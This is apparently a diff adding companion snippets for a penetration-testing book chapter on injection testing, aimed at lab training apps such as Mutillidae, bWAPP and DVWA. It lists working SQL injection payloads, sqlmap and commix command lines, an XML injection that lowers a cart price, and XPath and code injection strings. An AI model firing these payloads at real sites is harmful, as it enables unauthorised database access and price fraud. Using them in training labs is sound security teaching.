@@ -1,0 +1,94 @@
+
+Chapter 7: Injection and Overflow Testing:
+
+SQLI
+
+In-band or ‘Classic’ SQLI
+
+username=''' AND (SELECT 6803 FROM(SELECT COUNT(*),CONCAT(0x71627a6271,(SELECT (ELT(6803=6803,1))),0x716a7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sFFK&password=''&login-php-submit-button=Login
+Blind SQLI
+
+
+Content-based Blind SQLI: 
+
+username=-1419' OR 7078=7078#&password=''&login-php-submit-button=Login
+Time-based Blind SQLI: 
+
+username=''' AND 9120=BENCHMARK(25000000,MD5(0x6b4e4344))-- yHeA&password=''&login-php-submit-button=Login
+
+
+Stacked or Compound SQLI
+
+SQL Query for User table:
+
+SELECT username FROM accounts WHERE username='''
+Corresponding Injection:
+
+‘ or 1=1 --  
+
+Resulting SQL query:
+
+ SELECT username FROM accounts WHERE username='' or 1=1 -- '
+
+
+Tool School:
+
+Running SLQmap:
+
+sqlmap -r mutillidae_sqlmap.req --threads=10 –b –-time-sec 10
+Starting BBQSQL
+
+ bbqsql
+
+XML Injection
+
+Basic XML code for shopping cart:
+
+<catalog>
+   <item id=”607”>
+       <brand>Russian River</brand>
+       <beer>Pliney the Elder, 12 oz.</beer>
+       <price>8.99</price>
+   </item>
+</catalog>
+
+
+XML Injection:
+
+3.99</price></item><item id=”608”><brand> Russian River</brand><beer>Pliney the Younger, 16 oz.</beer><price>3.99
+
+
+Result:
+
+<catalog>
+   <item id=”607”>
+       <brand>Russian River</brand>
+       <beer>Pliney the Elder, 12 oz.</beer>
+       <price>3.99</price>
+   </item>
+   <item id=”608”>
+       <brand> Russian River</brand>
+       <beer>Pliney the Younger, 16 oz.</beer>
+       <price>3.99</price>
+   </item>
+</catalog>
+
+
+
+XPath injection:
+
+ ‘ or ‘1’=’1 
+
+
+Code Injection:
+
+/bWAPP/phpi.php?message=test
+Code Injection #2:
+
+http://172.16.30.129/bWAPP/phpi.php?message=MikeRules
+
+
+Command Injections 
+
+commix --url http://172.16.30.136/dvwa/vulnerabilities/exec/ --cookie='PHPSESSID=006542ce513b7ed995a3a7eb889e1037; security=low' --data='ip=127.0.0.1&submit=submit'
+
